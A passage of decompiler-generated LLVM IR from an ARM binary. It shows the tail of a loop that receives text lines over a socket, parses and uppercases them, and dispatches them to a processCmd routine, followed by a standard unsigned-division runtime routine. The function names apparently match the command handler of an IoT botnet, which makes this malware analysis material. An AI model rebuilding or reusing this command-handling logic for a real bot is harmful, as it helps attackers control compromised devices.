  br i1 %v9_a1c0, label %dec_label_pc_a1e0, label %dec_label_pc_a1f8

dec_label_pc_a1e0:                                ; preds = %dec_label_pc_a1c8
  %tmp107 = icmp ugt i32 %v5_a1a4, %storemerge11
  br i1 %tmp107, label %dec_label_pc_9f2c, label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1c8, %dec_label_pc_a1e0
  %v2_a20c = add i32 %v2_a208, %v5_a598
  %v3_a214 = inttoptr i32 %v2_a20c to i8*
  store i8 0, i8* %v3_a214, align 1
  %v2_a228 = call i32 @trim(i8* %v4_a598)
  %v2_a240 = load i8, i8* %v4_a598, align 4
  %v7_a244 = icmp eq i8 %v2_a240, 46
  br i1 %v7_a244, label %dec_label_pc_a268, label %dec_label_pc_a578

dec_label_pc_a268:                                ; preds = %dec_label_pc_a1f8, %dec_label_pc_a278
  %v3_a24c.sink = phi i8* [ %storemerge7, %dec_label_pc_a278 ], [ %v4_a598, %dec_label_pc_a1f8 ]
  %v4_a24c = ptrtoint i8* %v3_a24c.sink to i32
  %v1_a250 = add i32 %v4_a24c, 1
  %storemerge7 = inttoptr i32 %v1_a250 to i8*
  %v2_a26c = load i8, i8* %storemerge7, align 1
  %v7_a270 = icmp eq i8 %v2_a26c, 32
  br i1 %v7_a270, label %dec_label_pc_a288, label %dec_label_pc_a278

dec_label_pc_a278:                                ; preds = %dec_label_pc_a268
  %v2_a27c = load i8, i8* %storemerge7, align 1
  %v2_a280 = icmp eq i8 %v2_a27c, 0
  br i1 %v2_a280, label %dec_label_pc_a288, label %dec_label_pc_a268

dec_label_pc_a288:                                ; preds = %dec_label_pc_a278, %dec_label_pc_a268
  %v2_a28c = load i8, i8* %storemerge7, align 1
  %v2_a290 = icmp eq i8 %v2_a28c, 0
  br i1 %v2_a290, label %dec_label_pc_a578, label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a288
  store i8 0, i8* %storemerge7, align 1
  %v3_a2b8 = call i32 @strlen(i8* %v5_a2ac)
  %v1_a2cc = add i32 %v3_a2b8, %v2_a2c8
  %v5_a2d0 = inttoptr i32 %v1_a2cc to i8*
  %v2_a318 = add i32 %v1_a2cc, -1
  br label %dec_label_pc_a300

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a300
  %v3_a2e0 = call i32 @strlen(i8* %v5_a2d0)
  %v1_a2f4 = add i32 %v2_a318, %v3_a2e0
  %v3_a2fc = inttoptr i32 %v1_a2f4 to i8*
  store i8 0, i8* %v3_a2fc, align 1
  br label %dec_label_pc_a300

dec_label_pc_a300:                                ; preds = %dec_label_pc_a298, %dec_label_pc_a2d8
  %v3_a308 = call i32 @strlen(i8* %v5_a2d0)
  %v1_a31c = add i32 %v3_a308, %v2_a318
  %v1_a320 = inttoptr i32 %v1_a31c to i8*
  %v2_a320 = load i8, i8* %v1_a320, align 1
  %v7_a324 = icmp eq i8 %v2_a320, 10
  br i1 %v7_a324, label %dec_label_pc_a2d8, label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a300
  %v3_a334 = call i32 @strlen(i8* %v5_a2d0)
  %v1_a348 = add i32 %v3_a334, %v2_a318
  %v1_a34c = inttoptr i32 %v1_a348 to i8*
  %v2_a34c = load i8, i8* %v1_a34c, align 1
  %v7_a350 = icmp eq i8 %v2_a34c, 13
  br i1 %v7_a350, label %dec_label_pc_a2d8, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a32c
  %v2_a37418 = load i8, i8* %v5_a2d0, align 1
  %v7_a37822 = icmp eq i8 %v2_a37418, 32
  br i1 %v7_a37822, label %dec_label_pc_a390, label %dec_label_pc_a380

dec_label_pc_a364:                                ; preds = %dec_label_pc_a380
  %v1_a368 = add i32 %v4_a37024, 1
  %v5_a36c = inttoptr i32 %v1_a368 to i8*
  %v2_a374 = load i8, i8* %v5_a36c, align 1
  %v7_a378 = icmp eq i8 %v2_a374, 32
  br i1 %v7_a378, label %dec_label_pc_a390, label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a358, %dec_label_pc_a364
  %v4_a37024 = phi i32 [ %v1_a368, %dec_label_pc_a364 ], [ %v1_a2cc, %dec_label_pc_a358 ]
  %stack_var_-56.023 = phi i8* [ %v5_a36c, %dec_label_pc_a364 ], [ %v5_a2d0, %dec_label_pc_a358 ]
  %v2_a384 = load i8, i8* %stack_var_-56.023, align 1
  %v2_a388 = icmp eq i8 %v2_a384, 0
  br i1 %v2_a388, label %dec_label_pc_a390, label %dec_label_pc_a364

dec_label_pc_a390:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a380, %dec_label_pc_a358
  %stack_var_-56.0.lcssa = phi i8* [ %v5_a2d0, %dec_label_pc_a358 ], [ %v5_a36c, %dec_label_pc_a364 ], [ %stack_var_-56.023, %dec_label_pc_a380 ]
  %v4_a370.lcssa = phi i32 [ %v1_a2cc, %dec_label_pc_a358 ], [ %v1_a368, %dec_label_pc_a364 ], [ %v4_a37024, %dec_label_pc_a380 ]
  store i8 0, i8* %stack_var_-56.0.lcssa, align 1
  %v1_a3a0 = add i32 %v4_a370.lcssa, 1
  %v2_a3e429 = load i8, i8* %v5_a2d0, align 1
  %v2_a3e831 = icmp eq i8 %v2_a3e429, 0
  br i1 %v2_a3e831, label %dec_label_pc_a3f0, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a390, %dec_label_pc_a3b4
  %storemerge633 = phi i8* [ %storemerge6, %dec_label_pc_a3b4 ], [ %v5_a2d0, %dec_label_pc_a390 ]
  %storemerge1332 = phi i32 [ %v1_a3d8, %dec_label_pc_a3b4 ], [ %v1_a2cc, %dec_label_pc_a390 ]
  %v2_a3b8 = load i8, i8* %storemerge633, align 1
  %v3_a3b8 = zext i8 %v2_a3b8 to i32
  %v1_a3c0 = call i32 @__GI_toupper(i32 %v3_a3b8)
  %v1_a3d0 = trunc i32 %v1_a3c0 to i8
  store i8 %v1_a3d0, i8* %storemerge633, align 1
  %v1_a3d8 = add i32 %storemerge1332, 1
  %storemerge6 = inttoptr i32 %v1_a3d8 to i8*
  %v2_a3e4 = load i8, i8* %storemerge6, align 1
  %v2_a3e8 = icmp eq i8 %v2_a3e4, 0
  br i1 %v2_a3e8, label %dec_label_pc_a3f0, label %dec_label_pc_a3b4

dec_label_pc_a3f0:                                ; preds = %dec_label_pc_a3b4, %dec_label_pc_a390
  store i32 %v1_a3a0, i32* @r0, align 4
  %v2_a404 = call i32 @__GI_strtok(i32 %v1_a3a0, i32 ptrtoint (i32* @global_var_11e84.71 to i32))
  store i32 %v1_a2cc, i32* %stack_var_-184, align 4
  %v2_a50036 = icmp eq i32 %v2_a404, 0
  br i1 %v2_a50036, label %dec_label_pc_a508, label %dec_label_pc_a41c

dec_label_pc_a41c:                                ; preds = %dec_label_pc_a3f0, %dec_label_pc_a4e8
  %stack_var_-28.039.in = phi i32 [ %v2_a4f0, %dec_label_pc_a4e8 ], [ %v2_a404, %dec_label_pc_a3f0 ]
  %stack_var_-32.137 = phi i32 [ %stack_var_-32.0, %dec_label_pc_a4e8 ], [ 1, %dec_label_pc_a3f0 ]
  %stack_var_-28.039 = inttoptr i32 %stack_var_-28.039.in to i8*
  %v2_a420 = load i8, i8* %stack_var_-28.039, align 1
  %v7_a424 = icmp eq i8 %v2_a420, 10
  br i1 %v7_a424, label %dec_label_pc_a4e8, label %dec_label_pc_a42c

dec_label_pc_a42c:                                ; preds = %dec_label_pc_a41c
  store i32 %stack_var_-32.137, i32* @r4, align 4
  %v3_a438 = call i32 @strlen(i8* nonnull %stack_var_-28.039)
  %v1_a440 = add i32 %v3_a438, 1
  %v1_a448 = call i32 @malloc(i32 %v1_a440)
  %v0_a458 = load i32, i32* @r4, align 4
  %v3_a458 = mul i32 %v0_a458, 4
  %v2_a464 = add i32 %v2_a548, %v3_a458
  %v2_a468 = inttoptr i32 %v2_a464 to i32*
  store i32 %v1_a448, i32* %v2_a468, align 4
  %v3_a474 = mul i32 %stack_var_-32.137, 4
  %v2_a480 = add i32 %v2_a548, %v3_a474
  %v1_a484 = inttoptr i32 %v2_a480 to i32*
  %v2_a484 = load i32, i32* %v1_a484, align 4
  store i32 %v2_a484, i32* @r4, align 4
  %v3_a490 = call i32 @strlen(i8* nonnull %stack_var_-28.039)
  %v1_a498 = add i32 %v3_a490, 1
  %v0_a49c = load i32, i32* @r4, align 4
  store i32 %v1_a498, i32* @r2, align 4
  %v2_a4ac = inttoptr i32 %v0_a49c to i8*
  %v3_a4ac = call i32 @__GI_memset(i8* %v2_a4ac, i32 0)
  %v2_a4c8 = load i32, i32* %v1_a484, align 4
  %v4_a4d8 = call i32 @strcpy(i32 %v2_a4c8, i8* nonnull %stack_var_-28.039)
  %v1_a4e0 = add i32 %stack_var_-32.137, 1
  br label %dec_label_pc_a4e8

dec_label_pc_a4e8:                                ; preds = %dec_label_pc_a41c, %dec_label_pc_a42c
  %stack_var_-32.0 = phi i32 [ %stack_var_-32.137, %dec_label_pc_a41c ], [ %v1_a4e0, %dec_label_pc_a42c ]
  store i32 0, i32* @r0, align 4
  %v2_a4f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_11e84.71 to i32))
  %v2_a500 = icmp eq i32 %v2_a4f0, 0
  br i1 %v2_a500, label %dec_label_pc_a508, label %dec_label_pc_a41c

dec_label_pc_a508:                                ; preds = %dec_label_pc_a4e8, %dec_label_pc_a3f0
  %stack_var_-32.1.lcssa = phi i32 [ 1, %dec_label_pc_a3f0 ], [ %stack_var_-32.0, %dec_label_pc_a4e8 ]
  %v3_a514 = call i32 @processCmd(i32 %stack_var_-32.1.lcssa, i32* nonnull %stack_var_-184)
  %v7_a520 = icmp slt i32 %stack_var_-32.1.lcssa, 2
  br i1 %v7_a520, label %dec_label_pc_a578, label %dec_label_pc_a538.lr.ph

dec_label_pc_a538.lr.ph:                          ; preds = %dec_label_pc_a508
  br label %dec_label_pc_a538

dec_label_pc_a538:                                ; preds = %dec_label_pc_a538.lr.ph, %dec_label_pc_a538
  %storemerge14104 = phi i32 [ 1, %dec_label_pc_a538.lr.ph ], [ %v1_a560, %dec_label_pc_a538 ]
  %v3_a540 = mul i32 %storemerge14104, 4
  %v2_a54c = add i32 %v2_a548, %v3_a540
  %v1_a550 = inttoptr i32 %v2_a54c to i32*
  %v2_a550 = load i32, i32* %v1_a550, align 4
  %v1_a558 = call i32 @free(i32 %v2_a550)
  %v1_a560 = add nuw nsw i32 %storemerge14104, 1
  %v5_a574 = icmp slt i32 %v1_a560, %stack_var_-32.1.lcssa
  br i1 %v5_a574, label %dec_label_pc_a538, label %dec_label_pc_a578

dec_label_pc_a578:                                ; preds = %dec_label_pc_a538, %dec_label_pc_a1f8, %dec_label_pc_a508, %dec_label_pc_a288, %dec_label_pc_9f0c
  %v2_a57c = load i32, i32* @global_var_1b898.46, align 4
  %v5_a598 = call i32 @recvLine(i32 %v2_a57c, i8* %v4_a598, i32 4096, i32 %v2_a588)
  %v3_a5a8 = icmp eq i32 %v5_a598, -1
  br i1 %v3_a5a8, label %dec_label_pc_9efc, label %dec_label_pc_a188

; uselistorder directives
  uselistorder i32 %v5_a598, { 1, 0 }
  uselistorder i32 %stack_var_-32.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_a4f0, { 1, 0 }
  uselistorder i8* %stack_var_-28.039, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-32.137, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge6, { 1, 0 }
  uselistorder i32 %v1_a3d8, { 1, 0 }
  uselistorder i8* %storemerge633, { 1, 0 }
  uselistorder i32 %v2_a318, { 1, 2, 0 }
  uselistorder i8* %v5_a2d0, { 0, 3, 2, 1, 4, 5, 7, 6 }
  uselistorder i32 %v1_a2cc, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge7, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_a1c0, { 1, 0 }
  uselistorder i32 %v3_a190, { 1, 0 }
  uselistorder i32 %storemerge11, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_a0b0, { 1, 0 }
  uselistorder i32 %v1_a094, { 1, 0 }
  uselistorder i32 %v1_9f68, { 1, 2, 0, 3 }
  uselistorder i32 %v2_a548, { 2, 0, 1 }
  uselistorder i8* %v4_a598, { 3, 0, 1, 2 }
  uselistorder i32 %v2_a588, { 2, 0, 1 }
  uselistorder i32 %v2_9db0, { 1, 0 }
  uselistorder i32 %v16_9d48, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_1b898.46, { 2, 0, 1, 3, 4 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_1b890.48, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_1dafc.51, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 0, 2, 3, 4, 1 }
  uselistorder i32 ()* @rand_next, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @rand_init, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a578, { 0, 2, 3, 1, 4 }
  uselistorder label %dec_label_pc_a538, { 1, 0 }
  uselistorder label %dec_label_pc_a4e8, { 1, 0 }
  uselistorder label %dec_label_pc_a41c, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 1, 0 }
  uselistorder label %dec_label_pc_a390, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a380, { 1, 0 }
  uselistorder label %dec_label_pc_a300, { 1, 0 }
  uselistorder label %dec_label_pc_a268, { 1, 0 }
  uselistorder label %dec_label_pc_a1f8, { 1, 0 }
  uselistorder label %dec_label_pc_a17c, { 1, 0 }
  uselistorder label %dec_label_pc_a0ec, { 1, 0 }
  uselistorder label %dec_label_pc_a0ac, { 1, 0 }
  uselistorder label %dec_label_pc_9fbc, { 1, 0 }
  uselistorder label %dec_label_pc_9f74, { 1, 0 }
  uselistorder label %dec_label_pc_9efc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9ee4, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_a5c8 = add i32 %arg2, -1
  %v7_a5c8 = icmp eq i32 %arg2, 1
  br i1 %v7_a5c8, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_a5cc = load i32, i32* @r0, align 4
  ret i32 %v2_a5cc

bb80:                                             ; preds = %entry
  %v2_a5c8 = icmp eq i32 %arg2, 0
  br i1 %v2_a5c8, label %dec_label_pc_a6b0, label %dec_label_pc_a5d4

dec_label_pc_a5d4:                                ; preds = %bb80
  %v0_a5d4 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_a5d4, %arg2
  br i1 %tmp, label %dec_label_pc_a5dc, label %dec_label_pc_a668

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_a5d4
  %v2_a5dc = and i32 %v1_a5c8, %arg2
  %v4_a5dc = icmp eq i32 %v2_a5dc, 0
  br i1 %v4_a5dc, label %dec_label_pc_a674, label %dec_label_pc_a5e4

dec_label_pc_a5e4:                                ; preds = %dec_label_pc_a5dc
  %v3_a5e4 = icmp ult i32 %arg2, 536870912
  br i1 %v3_a5e4, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_a5e4
  %v4_a5e8 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_a5e4, %.thread
  %v0_a608.pr36.ph = phi i32 [ %v4_a5e8, %.thread ], [ %arg2, %dec_label_pc_a5e4 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_a5e4 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_a608.pr36 = phi i32 [ %v4_a5fc, %bb83 ], [ %v0_a608.pr36.ph, %.preheader.preheader ]
  %v1_a600 = phi i32 [ %v4_a600, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_a5f4 = icmp ugt i32 %v0_a608.pr36, 268435455
  br i1 %v2_a5f4, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_a608thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_a5f8 = icmp ult i32 %v0_a608.pr36, %v0_a5d4
  br i1 %v4_a5f8, label %bb82, label %dec_label_pc_a608thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_a5fc = and i32 %v0_a608.pr36, 268435456
  %v3_a5fc = icmp eq i32 %v2_a5fc, 0
  %v4_a5fc = mul i32 %v0_a608.pr36, 16
  br i1 %v3_a5fc, label %bb83, label %dec_label_pc_a608.loopexit

bb83:                                             ; preds = %bb82
  %v2_a600 = and i32 %v1_a600, 268435456
  %v3_a600 = icmp eq i32 %v2_a600, 0
  %v4_a600 = mul i32 %v1_a600, 16
  br i1 %v3_a600, label %.preheader, label %dec_label_pc_a608thread-pre-split.loopexit.loopexit

dec_label_pc_a608thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_a61448.ph = phi i32 [ %v1_a600, %bb81 ], [ %v4_a600, %bb83 ]
  %v0_a608.pr38.ph = phi i32 [ %v0_a608.pr36, %bb81 ], [ %v4_a5fc, %bb83 ]
  br label %dec_label_pc_a608thread-pre-split.loopexit

dec_label_pc_a608thread-pre-split.loopexit:       ; preds = %dec_label_pc_a608thread-pre-split.loopexit.loopexit, %.thread2
  %v1_a61448 = phi i32 [ %v1_a600, %.thread2 ], [ %v1_a61448.ph, %dec_label_pc_a608thread-pre-split.loopexit.loopexit ]
  %v0_a608.pr38 = phi i32 [ %v0_a608.pr36, %.thread2 ], [ %v0_a608.pr38.ph, %dec_label_pc_a608thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a608thread-pre-split

dec_label_pc_a608thread-pre-split:                ; preds = %dec_label_pc_a608thread-pre-split.loopexit, %bb85
  %v1_a61446 = phi i32 [ %v1_a61448, %dec_label_pc_a608thread-pre-split.loopexit ], [ %v3_a614, %bb85 ]
  %v0_a608.pr = phi i32 [ %v0_a608.pr38, %dec_label_pc_a608thread-pre-split.loopexit ], [ %v3_a610, %bb85 ]
  br label %dec_label_pc_a608

dec_label_pc_a608.loopexit:                       ; preds = %bb82
  br label %dec_label_pc_a608

dec_label_pc_a608:                                ; preds = %dec_label_pc_a608.loopexit, %dec_label_pc_a608thread-pre-split
  %v1_a614 = phi i32 [ %v1_a61446, %dec_label_pc_a608thread-pre-split ], [ %v1_a600, %dec_label_pc_a608.loopexit ]
  %v1_a610 = phi i32 [ %v0_a608.pr, %dec_label_pc_a608thread-pre-split ], [ %v4_a5fc, %dec_label_pc_a608.loopexit ]
  %v2_a608 = icmp slt i32 %v1_a610, 0
  br i1 %v2_a608, label %dec_label_pc_a61c, label %bb84

bb84:                                             ; preds = %dec_label_pc_a608
  %v4_a60c = icmp ult i32 %v1_a610, %v0_a5d4
  br i1 %v4_a60c, label %bb85, label %dec_label_pc_a61c

bb85:                                             ; preds = %bb84
  %v3_a610 = mul i32 %v1_a610, 2
  %v2_a614 = icmp slt i32 %v1_a614, 0
  %v3_a614 = mul i32 %v1_a614, 2
  br i1 %v2_a614, label %dec_label_pc_a61c, label %dec_label_pc_a608thread-pre-split

dec_label_pc_a61c:                                ; preds = %bb84, %dec_label_pc_a608, %bb85
  %v2_a62859 = phi i32 [ %v3_a614, %bb85 ], [ %v1_a614, %bb84 ], [ %v1_a614, %dec_label_pc_a608 ]
  %v1_a62051 = phi i32 [ %v3_a610, %bb85 ], [ %v1_a610, %bb84 ], [ %v1_a610, %dec_label_pc_a608 ]
  br label %dec_label_pc_a620

dec_label_pc_a620:                                ; preds = %.thread11, %dec_label_pc_a61c
  %v1_a654 = phi i32 [ %v4_a654, %.thread11 ], [ %v2_a62859, %dec_label_pc_a61c ]
  %v1_a628 = phi i32 [ %v0_a660, %.thread11 ], [ 0, %dec_label_pc_a61c ]
  %v1_a658 = phi i32 [ %v4_a658, %.thread11 ], [ %v1_a62051, %dec_label_pc_a61c ]
  %v1_a624 = phi i32 [ %v0_a650, %.thread11 ], [ %v0_a5d4, %dec_label_pc_a61c ]
  %v3_a620 = icmp ult i32 %v1_a624, %v1_a658
  br i1 %v3_a620, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_a620
  %v3_a624 = sub i32 %v1_a624, %v1_a658
  %v3_a628 = or i32 %v1_a628, %v1_a654
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_a620, %bb86
  %v1_a630 = phi i32 [ %v1_a624, %dec_label_pc_a620 ], [ %v3_a624, %bb86 ]
  %v1_a634 = phi i32 [ %v1_a628, %dec_label_pc_a620 ], [ %v3_a628, %bb86 ]
  %v4_a62c = udiv i32 %v1_a658, 2
  %v6_a62c = icmp ult i32 %v1_a630, %v4_a62c
  br i1 %v6_a62c, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_a630 = urem i32 %v1_a658, 2
  %v4_a630 = icmp eq i32 %v3_a630, 0
  %v6_a630 = sub i32 %v1_a630, %v4_a62c
  br i1 %v4_a630, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_a634 = udiv i32 %v1_a654, 2
  %v6_a634 = or i32 %v1_a634, %v5_a634
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_a63c = phi i32 [ %v6_a630, %bb87 ], [ %v1_a630, %.thread7 ], [ %v6_a630, %bb88 ]
  %v1_a640 = phi i32 [ %v1_a634, %bb87 ], [ %v1_a634, %.thread7 ], [ %v6_a634, %bb88 ]
  %v4_a638 = udiv i32 %v1_a658, 4
  %v6_a638 = icmp ult i32 %v1_a63c, %v4_a638
  br i1 %v6_a638, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_a63c = and i32 %v1_a658, 2
  %v4_a63c = icmp eq i32 %v3_a63c, 0
  %v6_a63c = sub i32 %v1_a63c, %v4_a638
  br i1 %v4_a63c, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_a640 = udiv i32 %v1_a654, 4
  %v6_a640 = or i32 %v1_a640, %v5_a640
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_a648 = phi i32 [ %v6_a63c, %bb89 ], [ %v1_a63c, %.thread8 ], [ %v6_a63c, %bb90 ]
  %v1_a64c = phi i32 [ %v1_a640, %bb89 ], [ %v1_a640, %.thread8 ], [ %v6_a640, %bb90 ]
  %v4_a644 = udiv i32 %v1_a658, 8
  %v6_a644 = icmp ult i32 %v1_a648, %v4_a644
  br i1 %v6_a644, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_a648 = and i32 %v1_a658, 4
  %v4_a648 = icmp eq i32 %v3_a648, 0
  %v6_a648 = sub i32 %v1_a648, %v4_a644
  br i1 %v4_a648, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_a64c = udiv i32 %v1_a654, 8
  %v6_a64c = or i32 %v1_a64c, %v5_a64c
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_a660 = phi i32 [ %v1_a64c, %bb91 ], [ %v1_a64c, %.thread9 ], [ %v6_a64c, %bb92 ]
  %v0_a650 = phi i32 [ %v6_a648, %bb91 ], [ %v1_a648, %.thread9 ], [ %v6_a648, %bb92 ]
  %v2_a650 = icmp eq i32 %v0_a650, 0
  br i1 %v2_a650, label %dec_label_pc_a660, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_a654, 16
  br i1 %tmp140, label %dec_label_pc_a660, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_a654 = udiv i32 %v1_a654, 16
  %v4_a658 = udiv i32 %v1_a658, 16
  br label %dec_label_pc_a620

dec_label_pc_a660:                                ; preds = %thread-pre-split, %bb93
  ret i32 %v0_a660

dec_label_pc_a668:                                ; preds = %dec_label_pc_a5d4
  %v9_a5d4 = icmp eq i32 %v0_a5d4, %arg2
  %. = zext i1 %v9_a5d4 to i32
  ret i32 %.

dec_label_pc_a674:                                ; preds = %dec_label_pc_a5dc
  %v2_a674 = icmp ugt i32 %arg2, 65535
  br i1 %v2_a674, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_a674
  %v2_a678 = and i32 %arg2, 32768
  %v3_a678 = icmp eq i32 %v2_a678, 0
  %v4_a678 = udiv i32 %arg2, 65536
  br i1 %v3_a678, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_a674
  %v0_a68465 = phi i32 [ %arg2, %dec_label_pc_a674 ], [ %v4_a678, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_a688 = phi i32 [ %v0_a68465, %.thread16 ], [ %v4_a678, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_a684 = icmp ugt i32 %v1_a688, 255
  br i1 %v2_a684, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_a688 = and i32 %v1_a688, 128
  %v3_a688 = icmp eq i32 %v2_a688, 0
  %v4_a688 = udiv i32 %v1_a688, 256
  br i1 %v3_a688, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_a68c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_a698 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_a68c, %bb100 ]
  %v1_a694 = phi i32 [ %v1_a688, %bb98 ], [ %v4_a688, %bb99 ], [ %v4_a688, %bb100 ]
  %v2_a690 = icmp ugt i32 %v1_a694, 15
  br i1 %v2_a690, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_a694 = and i32 %v1_a694, 8
  %v3_a694 = icmp eq i32 %v2_a694, 0
  %v4_a694 = udiv i32 %v1_a694, 16
  br i1 %v3_a694, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_a698 = add nsw i32 %v1_a698, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_a6a0 = phi i32 [ %v1_a698, %.thread17 ], [ %v1_a698, %bb101 ], [ %v2_a698, %bb102 ]
  %v5_a6a4 = phi i32 [ %v1_a694, %.thread17 ], [ %v4_a694, %bb101 ], [ %v4_a694, %bb102 ]
  %v2_a69c = icmp ugt i32 %v5_a6a4, 3
  %v7_a69c = icmp eq i32 %v5_a6a4, 4
  %v2_a6a0 = xor i1 %v7_a69c, true
  %v3_a6a0 = and i1 %v2_a69c, %v2_a6a0
  br i1 %v3_a6a0, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_a6a0 = add nsw i32 %v4_a6a0, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_a6a4 = phi i32 [ %v4_a6a0, %.thread18 ], [ %v5_a6a0, %bb103 ]
  %v2_a6a4 = xor i1 %v2_a69c, true
  %v3_a6a4 = or i1 %v7_a69c, %v2_a6a4
  br i1 %v3_a6a4, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_a6a4 = udiv i32 %v5_a6a4, 2
  %v9_a6a4 = add i32 %v4_a6a4, %v8_a6a4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_a6a8 = phi i32 [ %v4_a6a4, %bb104 ], [ %v9_a6a4, %bb105 ]
  %v6_a6a8 = lshr i32 %v0_a5d4, %v1_a6a8
  ret i32 %v6_a6a8

dec_label_pc_a6b0:                                ; preds = %bb80
  %v0_a6b0 = load i32, i32* @lr, align 4
  %v0_a6b4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_a6b0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_a6a4, { 1, 0 }
  uselistorder i1 %v7_a69c, { 1, 0 }
  uselistorder i32 %v4_a694, { 1, 0 }
  uselistorder i32 %v1_a694, { 1, 0, 2, 3 }
  uselistorder i32 %v4_a688, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_a688, { 1, 0, 2, 3 }
  uselistorder i32 %v4_a678, { 1, 0 }
  uselistorder i32 %v0_a650, { 1, 0 }
  uselistorder i32 %v4_a644, { 1, 0 }
  uselistorder i32 %v1_a64c, { 1, 2, 0 }
  uselistorder i32 %v4_a638, { 1, 0 }
  uselistorder i32 %v1_a640, { 1, 2, 0 }
  uselistorder i32 %v4_a62c, { 1, 0 }
  uselistorder i32 %v1_a634, { 1, 2, 0 }
  uselistorder i32 %v1_a658, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_a628, { 1, 0 }
  uselistorder i32 %v1_a654, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_a614, { 1, 0 }
  uselistorder i32 %v3_a610, { 1, 0 }
  uselistorder i32 %v1_a610, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_a614, { 1, 2, 0, 3 }
  uselistorder i32 %v4_a600, { 1, 0 }
  uselistorder i32 %v4_a5fc, { 2, 1, 0 }
  uselistorder i32 %v1_a600, { 2, 1, 3, 0, 4 }
